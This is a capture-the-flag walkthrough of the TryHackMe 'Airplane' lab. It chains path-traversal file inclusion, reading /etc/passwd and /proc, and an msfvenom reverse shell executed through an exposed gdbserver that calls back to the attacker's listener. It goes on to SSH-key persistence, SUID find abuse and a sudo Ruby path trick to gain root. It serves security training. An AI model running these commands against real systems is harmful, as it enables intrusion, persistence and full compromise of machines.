---
title: "TryHackMe - Airplane Walkthrough"
description: "A complete walkthrough for the Airplane room on TryHackMe. Explore how Local File Inclusion (LFI), gdbserver remote debugging, SUID binaries, and sudo Ruby permissions chain together to compromise a Linux machine."
pubDate: 2026-06-14
platform: "TryHackMe"
difficulty: "Medium"
ipAddress: "10.10.X.X"
tags: ["LFI", "gdbserver", "SUID", "Ruby", "Linux"]
category: "Linux"
---

Airplane is a Linux-based machine that demonstrates how seemingly low-impact vulnerabilities can be chained together to achieve full system compromise. The room focuses on web application enumeration, Local File Inclusion (LFI), process discovery through the Linux `/proc` filesystem, understanding exposed services, and privilege escalation through system misconfigurations.

The most interesting aspect of this room was not a single vulnerability, but the methodology required to move from information disclosure to code execution and finally root access.

---

## Initial Enumeration

### Network Scan
We start with a comprehensive `nmap` scan to discover open ports and running services.

```bash
sudo nmap <TARGET-IP> -p- -sS -sV -vvv --min-rate 5000 -oN nmap_result
```

### Scan Results

![Nmap scan results showing ports 22, 6048, and 8000](/images/airplane/nmap_result.png)

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu
6048/tcp open  x11?
8000/tcp open  http    Werkzeug httpd 3.0.2 (Python 3.8.10)
Service Info: OS: Linux
```

The scan reveals three exposed services:
1. **SSH (Port 22)**: Secure shell access.
2. **HTTP (Port 8000)**: A Python-based Werkzeug web application.
3. **Unusual Service (Port 6048)**: Needs further investigation.

### Virtual Host Discovery
While interacting with the web application on port 8000, we inspect the HTTP response headers:

```bash
curl -I http://<TARGET-IP>:8000
```

```text
HTTP/1.1 302 FOUND
Server: Werkzeug/3.0.2 Python/3.8.10
Location: http://airplane.thm:8000/?page=index.html
```

The `Location` header reveals the hostname: `airplane.thm`. We add this to our local `/etc/hosts` file:

![Inspecting headers and hostname](/images/airplane/hostname.png)

```bash
echo "<TARGET-IP> airplane.thm" | sudo tee -a /etc/hosts
```

> [!TIP]
> Always inspect HTTP response headers. Redirects, virtual hosts, and framework fingerprints often provide valuable clues during initial reconnaissance.

---

## Web Enumeration & LFI

### Directory Brute Forcing
We run `ffuf` to discover hidden directories:

```bash
ffuf -u http://airplane.thm:8000/FUZZ -w /usr/share/wordlists/dirb/common.txt -r -rate 50
```

No immediately useful endpoints are discovered. Consequently, we shift our focus toward understanding the application's parameters.

### Local File Inclusion (LFI)
The URL format (`?page=index.html`) suggests dynamic file loading. We test for Path Traversal:

```bash
curl "http://airplane.thm:8000/?page=../etc/passwd"       # Fails
curl "http://airplane.thm:8000/?page=../../etc/passwd"     # Fails
curl "http://airplane.thm:8000/?page=../../../etc/passwd"    # Fails
curl "http://airplane.thm:8000/?page=../../../../etc/passwd"  # Works!
```

### LFI Response

![Local File Inclusion Path Traversal](/images/airplane/Path_Traversal.png)

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
hudson:x:1000:1000:hudson,,,:/home/hudson:/bin/bash
...
```

This confirms arbitrary local files can be read from the filesystem.

> [!NOTE]
> Once LFI is confirmed, shift focus toward target mapping. Useful paths include:
> - `/etc/passwd` & `/etc/hosts`
> - `/etc/crontab`
> - `/proc/net/tcp` (to map active internal ports)
> - `/proc/1/cmdline` & `/proc/self/cmdline`

---

## Process Enumeration via `/proc`

### Enumerating Active TCP Sockets
Using our LFI, we read the `/proc/net/tcp` endpoint to map active listeners:

```bash
curl http://airplane.thm:8000/?page=../../../../proc/net/tcp
```

This exposes active TCP sockets in hex format, helping verify running local services.

![TCP sockets listed in /proc/net/tcp](/images/airplane/active_tcp_connections.png)

### Enumerating Running Processes
To identify the service running on port `6048`, we enumerate processes by querying `/proc/[PID]/cmdline` iteratively. This reveals a remote debugging utility running on that port: **gdbserver**.

### What is gdbserver?
`gdbserver` is a lightweight remote debugging tool that allows a remote client running GDB to control and interact with a process running on another target machine. This provides a clear path to Remote Code Execution (RCE) if access is unauthenticated.

---

## Initial Foothold

### 1. Payload Generation
First, we generate a reverse shell ELF binary using `msfvenom`:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<YOUR-IP> LPORT=8999 PrependFork=true -f elf -o shell.elf
```

### 2. Exploiting gdbserver
We open our local debugger `gdb` and connect to the remote service to upload and execute our payload:

```text
$ gdb
(gdb) target extended-remote airplane.thm:6048
(gdb) remote put shell.elf /tmp/shell.elf
(gdb) set remote exec-file /tmp/shell.elf
(gdb) run
```

### 3. Catching the Shell
On our attacking machine, we set up a Netcat listener:

```bash
nc -lvnp 8999
```

Upon executing `run` in GDB, we receive a callback:

![Reverse shell callback as hudson](/images/airplane/rev_shell.png)

```text
connect to [ATTACKER-IP] from [TARGET-IP]
whoami
hudson
```

### 4. Upgrade TTY
We upgrade to a fully interactive TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo; fg
export TERM=xterm-256color
```

---

## SSH Key Stabilization

While enumerating `hudson`'s home directory, we observe the presence of `~/.ssh`. To establish a stable connection, we add our public SSH key to `/home/hudson/.ssh/authorized_keys`:

```bash
echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

We can now cleanly log in via SSH:

```bash
ssh hudson@airplane.thm
```

---

## Privilege Escalation: Carlos User Transition

### SUID Search
We query the system for SUID binaries:

![SUID binaries scan using find command](/images/airplane/find_command.png)

```bash
find / -type f -perm -u=s 2>/dev/null
```

```text
...
/usr/bin/find
/usr/bin/sudo
/usr/bin/su
```

The permissions and ownership of `/usr/bin/find` appear highly unusual:

```bash
ls -lh /usr/bin/find
```
```text
-rwsr-xr-x 1 carlos carlos 313K Feb 18 2020 /usr/bin/find
```

It is owned by user `carlos` and has the SUID bit set. According to **GTFOBins**, we can run commands as `carlos` by using the `-exec` flag:

![Spawning a shell as carlos using find SUID](/images/airplane/find_priv_escalation.png)

```bash
find . -exec /bin/bash -p \; -quit
```

### Stabilizing the Carlos Session
We verify our context:
- Real User: `hudson`
- Effective User: `carlos`

To transition fully, we add our SSH key to `/home/carlos/.ssh/authorized_keys`. 

![carlos SSH authorized_keys file permission mistake](/images/airplane/carlos_ssh_authorized_keys_file_mistake.png)

> [!WARNING]
> SSH enforces strict key file permissions. If authorized_keys permissions are too permissive, SSH authentication will ignore the key. Ensure permissions are set correctly:

![SSH authorized_keys file permissions changed successfully](/images/airplane/authorized_keys_file_permission_changed.png)

```bash
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
```

Once updated, we log in cleanly as `carlos`:

```bash
ssh carlos@airplane.thm
```

---

## Privilege Escalation: Root Access

We inspect Carlos's sudo permissions:

```bash
sudo -l
```

```text
Matching Defaults entries for carlos on airplane:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User carlos may run the following commands on airplane:
    (ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
```

Carlos is permitted to run any Ruby script ending in `.rb` as root without a password.

### Exploitation
We write a simple one-line script to launch a privileged bash shell:

```bash
echo 'exec "/bin/bash"' > /tmp/root_shell.rb
```

We execute it using `sudo`:

![Root shell execution via Ruby script](/images/airplane/ruby_shell_as_root.png)

```bash
sudo /usr/bin/ruby /root/../tmp/root_shell.rb
```

We verify our privileges:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

We are now **root**!

---

## Key Takeaways
- **LFI Scope**: Local File Inclusion vulnerabilities can expose crucial process data via the Linux `/proc` filesystem.
- **Service Security**: Leaving developer debugging ports like `gdbserver` exposed to the public network permits direct, unauthenticated code execution.
- **SSH Lockdowns**: Correct permissions (`600` for keys, `700` for folders) are strictly required for successful SSH key authentication.
